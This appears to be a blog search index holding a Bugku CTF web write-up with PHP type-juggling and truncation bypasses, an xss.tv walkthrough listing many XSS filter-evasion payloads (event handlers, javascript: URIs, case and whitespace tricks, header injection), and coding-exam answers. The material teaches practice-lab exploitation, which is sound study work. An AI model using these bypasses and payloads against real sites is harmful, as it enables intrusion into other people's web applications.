can not be your username.\u0026#39;; else if (md5($_GET[\u0026#39;username\u0026#39;]) === md5($_GET[\u0026#39;password\u0026#39;])) die(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;Invalid password\u0026#39;; } ?\u0026gt; http://120.24.86.145:9009/18.php?username[]=1\u0026amp;password[]=\nFlag: flag{bugk1u-ad8-3dsa-2}\nextract变量覆盖 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 http://120.24.86.145:9009/1.php \u0026lt;?php $flag=\u0026#39;xxx\u0026#39;; extract($_GET); if(isset($shiyan)) { $content=trim(file_get_contents($flag)); if($shiyan==$content) { echo\u0026#39;flag{xxx}\u0026#39;; } else { echo\u0026#39;Oh.no\u0026#39;; } } ?\u0026gt; strcmp比较字符串 1 2 3 4 5 6 7 8 9 10 11 12 http://120.24.86.145:9009/6.php \u0026lt;?php $flag = \u0026#34;flag{xxxxx}\u0026#34;; if (isset($_GET[\u0026#39;a\u0026#39;])) { if (strcmp($_GET[\u0026#39;a\u0026#39;], $flag) == 0) //如果 str1 小于 str2 返回 \u0026lt; 0； 如果 str1大于 str2返回 \u0026gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;No\u0026#39;; } ?\u0026gt; http://120.24.86.145:9009/6.php?a[]\nFlag: flag{bugku_dmsj_912k}\nurldecode二次编码绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 http://120.24.86.145:9009/10.php \u0026lt;?php if(eregi(\u0026#34;hackerDJ\u0026#34;,$_GET[id])) { echo(\u0026#34; not allowed! \u0026#34;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \u0026#34;hackerDJ\u0026#34;) { echo \u0026#34; Access granted! \u0026#34;; echo \u0026#34; flag \u0026#34;; } ?\u0026gt; http://120.24.86.145:9009/10.php?id=hackerD%254a\nflag{bugku__daimasj-1t2} 数组返回NULL绕过 1 2 3 4 5 6 7 8 9 10 11 12 http://120.24.86.145:9009/19.php \u0026lt;?php $flag = \u0026#34;flag\u0026#34;; if (isset ($_GET[\u0026#39;password\u0026#39;])) { if (ereg (\u0026#34;^[a-zA-Z0-9]+$\u0026#34;, $_GET[\u0026#39;password\u0026#39;]) === FALSE) echo \u0026#39;You password must be alphanumeric\u0026#39;; else if (strpos ($_GET[\u0026#39;password\u0026#39;], \u0026#39;--\u0026#39;) !== FALSE) die(\u0026#39;Flag: \u0026#39; . $flag); else echo \u0026#39;Invalid password\u0026#39;; } ?\u0026gt; http://120.24.86.145:9009/19.php?password=a%00--\nflag{ctf-bugku-ad-2131212}\n弱类型整数大小比较绕过 1 2 3 4 5 6 http://120.24.86.145:9009/22.php $temp = $_GET[\u0026#39;password\u0026#39;]; is_numeric($temp)?die(\u0026#34;no numeric\u0026#34;):NULL; if($temp\u0026gt;1336){ echo $flag; http://120.24.86.145:9009/22.php?password=1337x\nflag{bugku_null_numeric}\nsha()函数比较绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 http://120.24.86.145:9009/7.php \u0026lt;?php $flag = \u0026#34;flag\u0026#34;; if (isset($_GET[\u0026#39;name\u0026#39;]) and isset($_GET[\u0026#39;password\u0026#39;])) { var_dump($_GET[\u0026#39;name\u0026#39;]); echo \u0026#34; \u0026#34;; var_dump($_GET[\u0026#39;password\u0026#39;]); var_dump(sha1($_GET[\u0026#39;name\u0026#39;])); var_dump(sha1($_GET[\u0026#39;password\u0026#39;])); if ($_GET[\u0026#39;name\u0026#39;] == $_GET[\u0026#39;password\u0026#39;]) echo \u0026#39; Your password can not be your name! \u0026#39;; else if (sha1($_GET[\u0026#39;name\u0026#39;]) === sha1($_GET[\u0026#39;password\u0026#39;])) die(\u0026#39;Flag: \u0026#39;.$flag); else echo \u0026#39; Invalid password. \u0026#39;; } else echo \u0026#39; Login first! \u0026#39;; ?\u0026gt; http://120.24.86.145:9009/7.php?name[]\u0026amp;password[]=1\nflag{bugku--daimasj-a2}\nmd5加密相等绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 http://120.24.86.145:9009/13.php \u0026lt;?php $md51 = md5(\u0026#39;QNKCDZO\u0026#39;); $a = @$_GET[\u0026#39;a\u0026#39;]; $md52 = @md5($a); if(isset($a)){ if ($a != \u0026#39;QNKCDZO\u0026#39; \u0026amp;\u0026amp; $md51 == $md52) { echo \u0026#34;flag{*}\u0026#34;; } else { echo \u0026#34;false!!!\u0026#34;; }} else{echo \u0026#34;please input a\u0026#34;;} ?\u0026gt; http://120.24.86.145:9009/13.php?a=240610708\nflag{bugku-dmsj-am9ls}\n十六进制与数字比较 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 http://120.24.86.145:9009/20.php \u0026lt;?php error_reporting(0); function noother_says_correct($temp) { $flag = \u0026#39;flag{test}\u0026#39;; $one = ord(\u0026#39;1\u0026#39;); //ord — 返回字符的 ASCII 码值 $nine = ord(\u0026#39;9\u0026#39;); //ord — 返回字符的 ASCII 码值 $number = \u0026#39;3735929054\u0026#39;; // Check all the input characters! for ($i = 0; $i \u0026lt; strlen($number); $i++) { // Disallow all the digits! $digit = ord($temp{$i}); if ( ($digit \u0026gt;= $one) \u0026amp;\u0026amp; ($digit \u0026lt;= $nine) ) { // Aha, digit not allowed! return \u0026#34;flase\u0026#34;; } } if($number == $temp) return $flag; } $temp = $_GET[\u0026#39;password\u0026#39;]; echo noother_says_correct($temp); ?\u0026gt; http://120.24.86.145:9009/20.php?password=0xdeadc0de\nflag{Bugku-admin-ctfdaimash}\nereg正则%00截断 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 http://120.24.86.145:9009/5.php \u0026lt;?php $flag = \u0026#34;xxx\u0026#34;; if (isset ($_GET[\u0026#39;password\u0026#39;])) { if (ereg (\u0026#34;^[a-zA-Z0-9]+$\u0026#34;, $_GET[\u0026#39;password\u0026#39;]) === FALSE) { echo \u0026#39;You password must be alphanumeric\u0026#39;; } else if (strlen($_GET[\u0026#39;password\u0026#39;]) \u0026lt; 8 \u0026amp;\u0026amp; $_GET[\u0026#39;password\u0026#39;] \u0026gt; 9999999) { if (strpos ($_GET[\u0026#39;password\u0026#39;], \u0026#39;*-*\u0026#39;) !== FALSE) //strpos — 查找字符串首次出现的位置 { die(\u0026#39;Flag: \u0026#39; . $flag); } else { echo(\u0026#39;- have not been found\u0026#39;); } }else{ echo \u0026#39;Invalid password\u0026#39;; } } ?\u0026gt; 1 http://120.24.86.145:9009/5.php?password=9e9%00*-* flag{bugku-dm-sj-a12JH8}\nstrpos数组绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 http://120.24.86.145:9009/15.php \u0026lt;?php $flag = \u0026#34;flag\u0026#34;; if (isset ($_GET[\u0026#39;ctf\u0026#39;])) { if (@ereg (\u0026#34;^[1-9]+$\u0026#34;, $_GET[\u0026#39;ctf\u0026#39;]) === FALSE) echo \u0026#39;必须输入数字才行\u0026#39;; else if (strpos ($_GET[\u0026#39;ctf\u0026#39;], \u0026#39;#biubiubiu\u0026#39;) !== FALSE) die(\u0026#39;Flag: \u0026#39;.$flag); else echo \u0026#39;骚年，继续努力吧啊~\u0026#39;; } ?\u0026gt; http://120.24.86.145:9009/15.php?ctf=1%00%23biubiubiu\n或\nhttp://120.24.86.145:9009/15.php?ctf[]\nflag{Bugku-D-M-S-J572}\n数字验证正则绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 http://120.24.86.145:9009/21.php \u0026lt;?php error_reporting(0); $flag = \u0026#39;flag{test}\u0026#39;; if (\u0026#34;POST\u0026#34; == $_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;]) { $password = $_POST[\u0026#39;password\u0026#39;]; if (0 \u0026gt;= preg_match(\u0026#39;/^[[:graph:]]{12,}$/\u0026#39;, $password)) //preg_match — 执行一个正则表达式匹配 { echo \u0026#39;flag\u0026#39;; exit; } while (TRUE) { $reg = \u0026#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/\u0026#39;; if (6 \u0026gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(\u0026#39;punct\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;lower\u0026#39;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) { if (preg_match(\u0026#34;/[[:$pt:]]+/\u0026#34;, $password)) $c += 1; } if ($c \u0026lt; 3) break; //\u0026gt;=3，必须包含四种类型三种与三种以上 if (\u0026#34;42\u0026#34; == $password) echo $flag; else echo \u0026#39;Wrong password\u0026#39;; exit; } } ?\u0026gt; flag{Bugku_preg_match}\n","permalink":"https://ret2neo.cn/post/180406bugkuwriteup/","summary":"WEB WEB2 听说聪明的人都能找到答案 http://120.24.86.145:8002/web2/\n源码中有注释。 KEY{Web-2-bugKssNNikls9100}\n文件上传测试 http://103.238.227.13:10085/\nFlag格式：Flag:xxxxxxxxxxxxx\nFlag:42e97d465f962c53df9549377b513c7e\n上传文件后缀为PHP且修改content-type 值为image/gif 等即可。\n计算题 地址：http://120.24.86.145:8002/yanzhengma/\n修改前端限制。flag{CTF-bugku-0032}\nweb基础$_GET http://120.24.86.145:8002/get/\n访问http://120.24.86.145:8002/get/?what=flag 。flag{bugku_get_su8kej2en}\nweb基础$_POST http://120.24.86.145:8002/post/\n使用hackbar post what=flag 。 flag{bugku_get_ssseint67se}\n你从哪里来 http://120.24.86.145:9009/from.php\n添加HTTP头 Referer:https://www.google.com\nflag{bug-ku_ai_admin}\n头等舱 http://120.24.86.145:9009/hd.php\n响应头 flag{Bugku_k8_23s_istra}: ，在f12直接看看不出来。\nmd5 collision(NUPT_CTF) http://120.24.86.145:9009/md5.php\nhttp://120.24.86.145:9009/md5.php?a=s878926199a\nflag{md5_collision_is_easy}\n矛盾 http://120.24.86.145:8002/get/index1.php\n1 2 3 4 5 6 $num=$_GET[\u0026#39;num\u0026#39;]; if(!is_numeric($num)){ echo $num; if($num==1) echo \u0026#39;flag{**********}\u0026#39;; } http://120.24.86.145:8002/get/index1.php?num=1x\nhttp://120.24.86.145:8002/get/index1.php?num=1e0x\nflag{bugku-789-ps-ssdf}\nWEB3 flag就在这里快来找找吧 http://120.24.86.145:8002/web3/\nCTRL+U;CTRL+W;CTRL+END 得到：\n1 \u0026lt;!--\u0026amp;#75;\u0026amp;#69;\u0026amp;#89;\u0026amp;#123;\u0026amp;#74;\u0026amp;#50;\u0026amp;#115;\u0026amp;#97;\u0026amp;#52;\u0026amp;#50;\u0026amp;#97;\u0026amp;#104;\u0026amp;#74;\u0026amp;#75;\u0026amp;#45;\u0026amp;#72;\u0026amp;#83;\u0026amp;#49;\u0026amp;#49;\u0026amp;#73;\u0026amp;#73;\u0026amp;#73;\u0026amp;#125;--\u0026gt; 1 2 3 s = \u0026#39;\u0026amp;#75;\u0026amp;#69;\u0026amp;#89;\u0026amp;#123;\u0026amp;#74;\u0026amp;#50;\u0026amp;#115;\u0026amp;#97;\u0026amp;#52;\u0026amp;#50;\u0026amp;#97;\u0026amp;#104;\u0026amp;#74;\u0026amp;#75;\u0026amp;#45;\u0026amp;#72;\u0026amp;#83;\u0026amp;#49;\u0026amp;#49;\u0026amp;#73;\u0026amp;#73;\u0026amp;#73;\u0026amp;#125;\u0026#39; print \u0026#39;\u0026#39;.","title":"Bugku Writeup"},{"content":" http://test.xss.tv\nhttp://47.94.13.75/test/\ntest on Firefox 54.0 (64-bit)\nLevel1 1 2 3 4 5 6 view-source:http://47.94.13.75/test/level1.php?name=test \u0026lt;h2 align=center\u0026gt;欢迎用户test\u0026lt;/h2\u0026gt; 直接在文本中输出用户提交的变量 http://47.94.13.75/test/level1.php?name=\u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt; 收获：为HTML body添加标签。 Level2 1 2 3 4 5 6 view-source:http://47.94.13.75/test/level2.php?keyword=test \u0026lt;input name=keyword value=\u0026#34;test\u0026#34;\u0026gt; 直接在标签属性中用户提交的变量 http://47.94.13.75/test/level2.php?keyword=\u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt; 收获：闭合标签属性的双引号、闭合标签并在标签外添加script标签。 Level3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 view-source:http://47.94.13.75/test/level3.php?keyword=\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\%26 \u0026lt;h2 align=center\u0026gt;没有找到和\u0026#39;;!-\u0026amp;quot;\u0026amp;lt;findneo\u0026amp;gt;={()}/\\\u0026amp;amp;相关的结果.\u0026lt;/h2\u0026gt; \u0026lt;input name=keyword value=\u0026#39;\u0026#39;;!-\u0026amp;quot;\u0026amp;lt;findneo\u0026amp;gt;={()}/\\\u0026amp;amp;\u0026#39;\u0026gt; 两处输出都对双引号、尖括号和\u0026amp;进行了HTML实体编码，但前面的单引号可以被闭合，考虑使用input标签的某些事件执行脚本。 自动聚焦到输入框，打开就弹 http://47.94.13.75/test/level3.php?keyword=\u0026#39; onfocus=\u0026#39;alert()\u0026#39; autofocus=\u0026#39; 点击页面非输入框的任何地方以移开焦点 http://47.94.13.75/test/level3.php?keyword=\u0026#39; autofocus onblur=\u0026#39;alert() 点击输入框 http://47.94.13.75/test/level3.php?keyword=\u0026#39; onfocus=\u0026#39;alert() http://47.94.13.75/test/level3.php?keyword=\u0026#39; onclick=\u0026#39;alert() 在输入框输入 http://47.94.13.75/test/level3.php?keyword=\u0026#39; oninput=\u0026#39;alert() 输入然后点击搜索 http://47.94.13.75/test/level3.php?keyword=\u0026#39; onchange=\u0026#39;alert() 移动鼠标经过输入框 http://47.94.13.75/test/level3.php?keyword=\u0026#39; onmousemove=\u0026#39;alert() http://47.94.13.75/test/level3.php?keyword=\u0026#39; onmouseout=\u0026#39;alert() http://47.94.13.75/test/level3.php?keyword=\u0026#39; onmouseover=\u0026#39;alert() 点击输入框，进行按键操作 http://47.94.13.75/test/level3.php?keyword=\u0026#39; onkeydown=\u0026#39;alert() http://47.94.13.75/test/level3.php?keyword=\u0026#39; onkeyup=\u0026#39;alert() http://47.94.13.75/test/level3.php?keyword=\u0026#39; onkeypress=\u0026#39;alert() 双击输入框 http://47.94.13.75/test/level3.php?keyword=\u0026#39; ondblclick=\u0026#39;alert() 更多可用事件可以参考这里：https://www.w3schools.com/tags/ref_eventattributes.asp 收获：闭合标签属性的单引号并在标签中添加事件。 Level4 1 2 3 4 5 6 7 8 9 view-source:http://47.94.13.75/test/level4.php?keyword=\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\%26 \u0026lt;h2 align=center\u0026gt;没有找到和\u0026#39;;!-\u0026amp;quot;\u0026amp;lt;findneo\u0026amp;gt;={()}/\\\u0026amp;amp;相关的结果.\u0026lt;/h2\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;;!-\u0026#34;findneo={()}/\\\u0026amp;\u0026#34;\u0026gt; 在文本中编码了双引号、尖括号和\u0026amp;，在标签属性值中过滤了尖括号。 把上一题payload的单引号换成双引号应该都可以用 http://47.94.13.75/test/level4.php?keyword=\u0026#34; onfocus=\u0026#39;alert()\u0026#39; autofocus=\u0026#34; 收获：闭合标签属性的双引号并在标签中添加事件。 Level5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 view-source:http://47.94.13.75/test/level5.php?keyword=\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\%26 \u0026lt;h2 align=center\u0026gt;没有找到和\u0026#39;;!-\u0026amp;quot;\u0026amp;lt;findneo\u0026amp;gt;={()}/\\\u0026amp;amp;相关的结果.\u0026lt;/h2\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\\u0026amp;\u0026#34;\u0026gt; 在文本中编码了双引号、尖括号和\u0026amp;，标签属性值没有编码 进一步测试发现query会转成小写，\u0026lt;script，on等敏感词会加下划线 看起来事件和script标签都不好使，可以闭合原来的标签，自己添加标签，然后试着用用刚从书里学到的伪协议 点击findneo就能弹 http://47.94.13.75/test/level5.php?keyword=\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;javascript:alert(1);\u0026#34;\u0026gt;findneo\u0026lt;/a\u0026gt; 做一下美化 http://47.94.13.75/test/level5.php?keyword=\u0026#34; type=\u0026#34;hidden\u0026#34;/\u0026gt;\u0026lt;a href=\u0026#34;javascript:alert(1);\u0026#34;\u0026gt;aa\u0026lt;/a\u0026gt;\u0026lt;input type=\u0026#34;hidden vbscript和dataURI似乎都不能奏效。 收获：利用JavaScript伪协议。 Level6 1 2 3 4 5 6 7 8 9 10 11 12 13 http://47.94.13.75/test/level6.php?keyword=\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\%26 \u0026lt;h2 align=center\u0026gt;没有找到和\u0026#39;;!-findneo={()}/\\相关的结果.\u0026lt;/h2\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\\u0026amp;\u0026#34;\u0026gt; 在文本中编码了双引号、尖括号和\u0026amp;，标签值属性没有编码 进一步测试发现\u0026lt;script,on,href都被加下划线了，但是没有做全部转小写的操作，所以可以大小写绕过。 http://47.94.13.75/test/level6.php?keyword=\u0026#34;\u0026gt;\u0026lt;Script\u0026gt;alert()\u0026lt;/script\u0026gt; 收获：大小写绕过敏感词检测。 Level7 1 2 3 4 5 6 7 8 9 view-source:http://47.94.13.75/test/level7.php?keyword=\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\%26 \u0026lt;h2 align=center\u0026gt;没有找到和\u0026#39;;!-\u0026amp;quot;\u0026amp;lt;findneo\u0026amp;gt;={()}/\\\u0026amp;amp;相关的结果.\u0026lt;/h2\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\\u0026amp;\u0026#34;\u0026gt; 在文本中编码了双引号、尖括号和\u0026amp;，标签值属性没有编码 进一步测试发现on,script,href都被替换为空，但只执行一次，没有递归操作，可以用关键字嵌套来绕过。 http://47.94.13.75/test/level7.php?keyword=\u0026#34;\u0026gt;\u0026lt;soncript\u0026gt;alert()\u0026lt;/soncript\u0026gt; 收获：关键字嵌套（双写）绕过敏感词过滤。 Level8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 view-source:http://47.94.13.75/test/level8.php?keyword=\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\%26 \u0026lt;input name=keyword value=\u0026#34;\u0026#39;;!-\u0026amp;quot;\u0026amp;lt;findneo\u0026amp;gt;={()}/\\\u0026amp;amp;\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;\u0026#39;;!-\u0026amp;quot\u0026lt;findneo\u0026gt;={()}/\\\u0026amp;\u0026#34;\u0026gt;友情链接\u0026lt;/a\u0026gt; input标签的value属性输出处编码了双引号、尖括号和\u0026amp;；a标签的href属性输出处编码了双引号。 进一步测试发现数据都被转小写，on,script,href,data等都被加下划线了。 一番查找资料发现了可以通过JavaScript变换（利用空白符如水平制表符HT，换行符LF，回车键CR来截断关键字）的办法绕过 http://47.94.13.75/test/level8.php?keyword=javas%09cript:alert() http://47.94.13.75/test/level8.php?keyword=javas%0acript:alert() http://47.94.13.75/test/level8.php?keyword=javas%0dcript:alert() 可在http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html 页面内搜索“JavaScript变换”看到相关信息。 收获：空白符（特殊的结束标识符）绕过敏感词检测。 Level9 1 2 3 4 5 6 7 8 9 10 view-source:http://47.94.13.75/test/level9.php?keyword=http://\u0026#39;;!-\u0026#34;\u0026lt;finDneo\u0026gt;={()}/\\\u0026amp; \u0026lt;input name=keyword value=\u0026#34;http://\u0026#39;;!-\u0026amp;quot;\u0026amp;lt;findneo\u0026amp;gt;={()}/\\\u0026amp;amp;\u0026#34;\u0026gt; \u0026lt;/center\u0026gt;\u0026lt;center\u0026gt;\u0026lt;BR\u0026gt;\u0026lt;a href=\u0026#34;http://\u0026#39;;!-\u0026amp;quot\u0026lt;findneo\u0026gt;={()}/\\\u0026amp;\u0026#34;\u0026gt;友情链接\u0026lt;/a\u0026gt; 输入数据全部转为小写，且必须协议正确，刚开始以为必须以“http://”开头，后来发现只要含有就可以了。 input标签的值编码了双引号、尖括号和\u0026amp;；href处编码了双括号。 从上一题稍作变化即可 http://47.94.13.75/test/level9.php?keyword=javas%09cript:alert(\u0026#39;http://\u0026#39;) 收获：如果要检测URL协议，应该检测协议名是否在字符串的开头。 Level10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 view-source:http://47.94.13.75/test/level10.php?keyword=\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\%26 \u0026lt;h2 align=center\u0026gt;没有找到和\u0026#39;;!-\u0026amp;quot;\u0026amp;lt;findneo\u0026amp;gt;={()}/\\\u0026amp;amp;相关的结果.\u0026lt;/h2\u0026gt; 只有一个输出点，编码了双引号、尖括号和\u0026amp;。谷歌了很久，都说这几乎是不可能成的。（If angle brackets and double quote characters are escaped, this is enough to prevent XSS in HTML body and double quoted entity value contexts.） 无奈之下查了writeup，发现自己观察能力需要提高，显著的hidden就在眼皮底下，竟然一点都没有注意到。 有一个隐藏的表单如下： \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 可尝试其参数是否可能被注入 访问47.94.13.75/test/level10.php?keyword=asdf\u0026amp;t_link=\u0026#34;\u0026amp;t_history=\u0026#34;\u0026amp;t_sort=\u0026#34; 会发现在相应中t_sort是可注入双引号的，于是可以构造链接弹窗。 http://47.94.13.75/test/level10.php?t_sort=\u0026#34; autofocus onfocus=alert() type=\u0026#34;text 收获：注意测试隐藏元素。 这道题乍一看有些让人摸不着头脑，但仔细想想觉得这在真实环境中是会发生的。开发者利用隐藏的表单提交数据，然后就默认这些数据是可靠的，于是在忘记或者认为没必要在服务端做校验，这就导致了代码的缺陷。像本题的t_sort键就是个例子，所以如果遇到hidden的元素可以测一测。 Level11 1 2 3 4 5 6 7 8 9 test1:view-source:http://47.94.13.75/test/level11.php?keyword=\u0026amp;t_link=\u0026#34;\u0026lt;xss\u0026gt;\u0026amp;t_history=\u0026#34;\u0026lt;xss\u0026gt;\u0026amp;t_sort=\u0026#39;\u0026lt;xss\u0026gt;\u0026amp;t_ref=\u0026#34;\u0026lt;xss\u0026gt; 与上一题类似，表单中多了一个t_ref，但看起来只有t_sort可以注入。 test2:view-source:http://47.94.13.75/test/level11.php?t_sort=\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\%26 得到：\u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#39;;!-\u0026amp;quot;\u0026amp;lt;findneo\u0026amp;gt;={()}/\\\u0026amp;amp;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; 对双引号、尖括号和\u0026amp;进行了编码。input标签中value属性的双引号难以逃逸。 考虑莫名多出来的t_ref,猜测服务端是取请求头的referer值来返回，于是截包添加请求头。 referer: \u0026#34; autofocus onfocus=alert() type=\u0026#34;text 收获：寻找一些可能的、可控的输入！ Level12 1 2 3 4 view-source:http://47.94.13.75/test/level12.php?keyword=findneo 与上一题相似，这题修改的是UA。 收获：User-Agent（以及HTTP请求头的其他部分）也是可控的输入。 Level13 1 2 3 4 view-source:http://47.94.13.75/test/level13.php?keyword=findneo 与前面类似，修改Cookie。 收获：Cookie（以及HTTP请求头的其他部分）也是可控的输入。 Level16 1 2 3 4 5 6 http://47.94.13.75/test/level16.php 测试发现编码了/和空格 将后面内容注释掉，使用无需闭合的标签，使用特殊空白符代替空格即可 http://47.94.13.75/test/level16.php?keyword=findneo\u0026lt;img%0asrc=\u0026#39;\u0026#39;%0aonerror=alert(1)\u0026gt;\u0026lt;!-- 收获：注释符，空白符 ","permalink":"https://ret2neo.cn/post/180405xsstvchallenge/","summary":"http://test.xss.tv\nhttp://47.94.13.75/test/\ntest on Firefox 54.0 (64-bit)\nLevel1 1 2 3 4 5 6 view-source:http://47.94.13.75/test/level1.php?name=test \u0026lt;h2 align=center\u0026gt;欢迎用户test\u0026lt;/h2\u0026gt; 直接在文本中输出用户提交的变量 http://47.94.13.75/test/level1.php?name=\u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt; 收获：为HTML body添加标签。 Level2 1 2 3 4 5 6 view-source:http://47.94.13.75/test/level2.php?keyword=test \u0026lt;input name=keyword value=\u0026#34;test\u0026#34;\u0026gt; 直接在标签属性中用户提交的变量 http://47.94.13.75/test/level2.php?keyword=\u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt; 收获：闭合标签属性的双引号、闭合标签并在标签外添加script标签。 Level3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 view-source:http://47.94.13.75/test/level3.php?keyword=\u0026#39;;!-\u0026#34;\u0026lt;findneo\u0026gt;={()}/\\%26 \u0026lt;h2 align=center\u0026gt;没有找到和\u0026#39;;!-\u0026amp;quot;\u0026amp;lt;findneo\u0026amp;gt;={()}/\\\u0026amp;amp;相关的结果.\u0026lt;/h2\u0026gt; \u0026lt;input name=keyword value=\u0026#39;\u0026#39;;!","title":"xss.tv挑战赛"},{"content":" 2018.4.3 19:00 ~ 2018.4.3 21:00\n求回文子字符串数量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import sys def check(s): length=len(s) for i in range(length): if s[i]!=s[length-1-i]: return 0 return 1 s=sys.stdin.readline().strip() res=0 try: for i in range(len(s)): for j in range(i+1,len(s)+1): if check(s[i:j]): res=max(res,len(s[i:j])) except: print res exit(0) print res 根据规则输出IPv6地址类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import sys def check(ip): if len(ip)!=8: return 0 s=\u0026#34;0123456789abcdefABCDEF\u0026#34; for i in (\u0026#39;\u0026#39;.join(ip)).strip(): if i not in s: return 0 return 1 s=sys.stdin.readline().split(\u0026#34;:\u0026#34;) if not check(s): print \u0026#34;Error\u0026#34; elif int(s[0],16)^0xfe80\u0026lt;(2**6): print \u0026#34;LinkLocal\u0026#34; elif int(s[0],16)^0xfec0\u0026lt;(2**6): print \u0026#34;SiteLocal\u0026#34; elif int(s[0],16)^0xff00\u0026lt;(2**8): print \u0026#34;Multicast\u0026#34; elif \u0026#34;:\u0026#34;.join(s).strip()==\u0026#34;0000:0000:0000:0000:0000:0000:0000:0000\u0026#34;: print \u0026#34;Unspecified\u0026#34; elif \u0026#34;:\u0026#34;.join(s).strip()==\u0026#34;0000:0000:0000:0000:0000:0000:0000:0001\u0026#34;: print \u0026#34;Loopback\u0026#34; else: print \u0026#34;GlobalUnicast\u0026#34; 试用软件赚流量方案 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import sys def check_t(down): t_all=0 for i in range(len(down)): if down[i]==\u0026#39;1\u0026#39;: t_all+=appt[i] #print t_all,t,down return t_all\u0026lt;=t def get_m(down): m_all=0 for i in range(len(down)): if down[i]==\u0026#39;1\u0026#39;: m_all+=appm[i] return m_all def get_prior(a,b): #print a #print b return a if int(a,2)\u0026gt;int(b,2) else b def parse(down): res=[] res.extend([str(i+1) for i in range(len(down)) if down[i]==\u0026#39;1\u0026#39;]) print (\u0026#34; \u0026#34;.join(res)).strip() #,down t=int(sys.stdin.readline().strip()) appt=map(int,sys.stdin.readline().strip().split()) appm=map(int,sys.stdin.readline().strip().split()) length=len(appt) res,money=\u0026#34;0\u0026#34;*length,0 for i in xrange(2**length): down=bin(i)[2:].zfill(length) if check_t(down): tmpm=get_m(down) if tmpm \u0026gt;money: res,money=down,tmpm elif tmpm == money: res=get_prior(down,res) parse(res) ","permalink":"https://ret2neo.cn/post/180404huaweiexam/","summary":"2018.4.3 19:00 ~ 2018.4.3 21:00\n求回文子字符串数量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import sys def check(s): length=len(s) for i in range(length): if s[i]!=s[length-1-i]: return 0 return 1 s=sys.stdin.readline().strip() res=0 try: for i in range(len(s)): for j in range(i+1,len(s)+1): if check(s[i:j]): res=max(res,len(s[i:j])) except: print res exit(0) print res 根据规则输出IPv6地址类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import sys def check(ip): if len(ip)!","title":"华为2018年校园招聘软件题"},{"content":" note of https://www.ichunqiu.com/course/56927\nHacking三步曲 理解系统（Understanding） 系统性的基础课程学习，深入理解计算机系统运作机制。 破坏系统（Breaking） 